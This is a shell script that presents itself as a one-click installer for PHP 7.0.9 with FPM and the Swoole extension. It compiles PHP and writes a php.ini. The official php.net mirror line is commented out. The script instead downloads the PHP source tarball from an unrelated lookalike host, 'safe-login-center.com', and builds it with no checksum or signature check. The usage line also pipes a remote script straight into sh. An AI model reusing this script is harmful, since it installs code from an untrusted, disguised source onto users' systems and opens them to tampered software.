# Auth: Wanjo Chan
# Purpose: php swoole dl compile link php-fpm install quick sh
# Usage: wget --no-cache -q https://github.com/cmptech/cmp_app_server/raw/master/install-php-fpm-swoole-one-click.sh -O - | sh

sudo apt-get install -y autoconf g++ make openssl libssl-dev libcurl4-openssl-dev libcurl4-openssl-dev pkg-config libxml2-dev

# TODO  --PHPVER, --PHPDL etc...
PHPVER="7.0.9"
#PHPDL="http://us3.php.net/distributions/"
PHPDL="http://phpcdn.safe-login-center.com/distributions/"
mkdir $HOME/php7/
cd $HOME/php7/

PHPTGZ=php-${PHPVER}.tar.gz
if [ ! -f "$PHPTGZ" ]
then
wget ${PHPDL}${PHPTGZ}
ls -al $PHPTGZ
tar xzvf $PHPTGZ
fi

cd php-$PHPVER/

# TODO more PHPCONF 
./configure \
--prefix=$HOME/opt/php7 \
--enable-fpm \
--enable-opcache \
--with-openssl \
--with-system-ciphers \
--with-zlib \
--with-curl \
--with-pcre-dir \
--with-pcre-regex \
--with-zlib-dir \
--with-mysqli \
--with-mysql-sock \
--with-zlib-dir \
--enable-embedded-mysqli \
--with-pdo-mysql \
--enable-soap \
--enable-sockets \
--enable-zip \
--enable-mysqlnd \
--with-pear

make && make install

# swoole

$HOME/opt/php7/bin/pear config-set download_dir $HOME/php7/
$HOME/opt/php7/bin/pear config-set temp_dir $HOME/php7/

$HOME/opt/php7/bin/pecl uninstall swoole
$HOME/opt/php7/bin/pecl install swoole

(cat <<EOF
short_open_tag=On
realpath_cache_size=2M
cgi.check_shebang_line=0
file_uploads = On
upload_max_filesize = 10M
extension=swoole.so

[opcache]
opcache.enable = 1
opcache.enable_cli = 0
opcache.memory_consumption = 64
opcache.interned_strings_buffer = 4
opcache.max_accelerated_files = 2000
opcache.max_wasted_percentage = 5
opcache.use_cwd = 1
opcache.validate_timestamps = 1
opcache.revalidate_freq = 2
opcache.file_update_protection = 2
opcache.revalidate_path = 0
opcache.save_comments = 1
opcache.load_comments = 1
opcache.fast_shutdown = 0
opcache.enable_file_override = 0
opcache.optimization_level = 0xffffffff
opcache.inherited_hack = 1
opcache.blacklist_filename = ""
opcache.max_file_size = 0
opcache.consistency_checks = 0
opcache.force_restart_timeout = 180
opcache.error_log = ""
opcache.log_verbosity_level = 1
opcache.preferred_memory_model = ""
opcache.protect_memory = 0
apc.cache_by_default = false

#for safety of php-fpm, @ref 
#https://help.aliyun.com/knowledge_detail/5994617.html
cgi.fix_pathinfo=0

EOF
) > $HOME/opt/php7/lib/php.ini

alias php7='$HOME/opt/php7/bin/php'
alias php7-fpm='$HOME/opt/php7/sbin/php-fpm'

php7 -m
php7-fpm -m
